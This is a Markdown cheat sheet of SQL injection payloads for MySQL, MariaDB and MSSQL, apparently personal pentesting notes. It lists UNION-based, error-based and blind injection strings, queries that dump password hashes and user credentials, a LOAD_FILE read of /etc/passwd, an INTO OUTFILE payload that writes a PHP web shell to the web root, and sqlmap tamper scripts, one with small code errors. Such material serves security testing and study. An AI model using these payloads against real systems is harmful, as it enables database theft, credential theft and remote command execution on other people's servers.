# SQL Injection

### References

- [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [https://cloudinvent.com/blog/backdoor-webserver-using-mysql-sql-injection/](https://cloudinvent.com/blog/backdoor-webserver-using-mysql-sql-injection/)
- [https://sechow.com/bricks/docs/login-1.html](https://sechow.com/bricks/docs/login-1.html)
    
# MySQL

Login:

- `mysql -u user -h localhost -D database -p`

Skip Password: 

- `mysql -u user -h localhost -D database --password='passwd'`

Execute SQL Command:

- `mysql -u user -h localhost -D database --password='passwd' -e 'command'`

## Enum commands

Privileges:

- `SHOW GRANTS FOR CURRENT_USER();`
- `SHOW GRANTS FOR 'root'@'localhost';`
- `SELECT * FROM mysql.user;`

All Databases:

- `SHOW DATABASES;`

Use Database:

- `USE databasename;`

All Tables:

- `SHOW TABLES;`

All data from table:

- `SELECT * FROM tablename;`
    
    For better output, add `\G` instead of `;` at the end.
    

All columns/infos from table:

- `describe tablename;`

# **Query**

---

Get Version:

- `version()`
- `@@version`

Current User:

- `user()`

Current DB:

- `database()`

User privileges:

- `SELECT super_priv FROM mysql.user`
- `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
- `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
- `UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- -`

All Databases:

- `group_concat(Schema_NAME,"\r\n") FROM Information_Schema.SCHEMATA`

All tables from DB:

- `group_concat(TABLE_NAME) FROM Information_Schema.TABLES WHERE TABLE_SCHEMA = 'db_name'`
- `UNION SELECT table_name,NULL,FROM information_schema.tables`

All columns for all tabels in database:

- `group_concat(COLUMN_NAME) FROM Information_Schema.COLUMNS WHERE TABLE_SCHEMA = 'db_name'`

Get table and column name at once:

- `group_concat(TABLE_NAME,' : ',COLUMN_NAME,'\r\n') FROM Information_Schema.COLUMNS WHERE TABLE_SCHEMA = 'db'`

All columns for one table:

- `group_concat(COLUMN_NAME) FROM Information_Schema.COLUMNS WHERE TABLE_SCHEMA = 'db_name' AND TABLE_NAME = 'table_name'`

Show Input from table:

- `group_concat(role,' : ',name,' : ',email,' : ',password,'\r\n') from users`

List Password Hashes:

- `SELECT host, user, password FROM mysql.user;`

## Read Files

- `union select 1,2,3,LOAD_FILE('/etc/passwd')-- -`
- `Union Select TO_base64(LOAD_FILE("/var/www/html/index.php"))-- -`

## Writing Files

Checking the `secure_file_priv` value, empty means we can read/write files:

- `UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
- `SELECT * from users INTO OUTFILE '/tmp/credentials';`
- `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`

PHP code:

- `union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

# Attack types

---

## Union Select

Detect number of columns using `order by`

- `' order by 1-- -`

Detect number of columns using Union injection:

- `cn' UNION select 1,2,3-- -`
- `union select 1,2,3,version()-- -`

## Error Based

MariaDB payloads:

- `and extractvalue(1,concat(0x7e,version()))-- -`
- `AND (extractvalue(1,concat(0x7e,version())))`
- `and updatexml(1,concat(0x0a,version()),null)-- -`
- `and (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a)-- -`

Get pieces from output:

- `and extractvalue(0,concat(0,(select (select mid(<colum_name>,1,99)) from <db_name>.<table_name> limit 0,1)))`

Or

- `and extractvalue(0,concat(0,substring((select <colum_name> from <db_name>.<table_name> limit 0,1) from 1)))`

`IudGPHd9pEKiee9MkJ7ggPD89q3Yn…` 

We got the first 32 chars from the output,because the function `extractvalue()` only return this length of a string!

- `echo -n 'IudGPHd9pEKiee9MkJ7ggPD89q3Y' | wc -c`

Now change the `index` to 1+29 = `30` (29 because the … is 3 and 32-3=29)

- `and extractvalue(0x7e,concat(0x7e,substring((select <colum_name> from <db_name>.<table_name> limit 0,1) from 30)))`

`ndctnPeRQOmS2PQ7QIrbJEomFVG6` and the next `index` is 1+29+29 = `59`

When you see less then 32 chars, the output is finised and you can set `limit 0,1` to `limit 1,1` and so on `limit 2,1`

## Blind SQLi

5 sec to retrieve the response:

- `and sleep(5)#`

`length(database())=X` count up until the output

- `and length(database())=4#`

# MSSQL

---

Get Version:

- `-q "SELECT @@Version"`

Get Current Database:

- `-q "SELECT DB_NAME() AS [Current Database]"`

Get All Database Names:

- `-q "SELECT name FROM sys.databases"`
- `-q "Select name from sysdatabases"`
- `-q "SELECT name FROM master.dbo.sysdatabases"`

Get All Table Names:

- `-q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES"`

Get All Content from Table:

- `-q "SELECT * from [core_app].[dbo].tbl_users"`

# SQLMAP

---

See request:

- `-v 4`

Prefix and Suffix:

- `--prefix="' union select 1," --suffix=',3-- -'`

Add script:

- `--tamper script.py`

Injection cookie:

```python
import urllib.parse

def tamper(payload, **kwargs):
    cookies = '{"x'+payload+'":"99"}'
    cookies = urllib.parse.quote(cookies)
    return cookies%
```

Injection in data parameter:

```python
import base64
import urllib.parse

def tamper(payload, **kwargs):
    params = 'name1=value1%s&name2=value2' % payload

    data = urllib.parse.quote(params)
    data = base64.b64encode(data)

    return data
```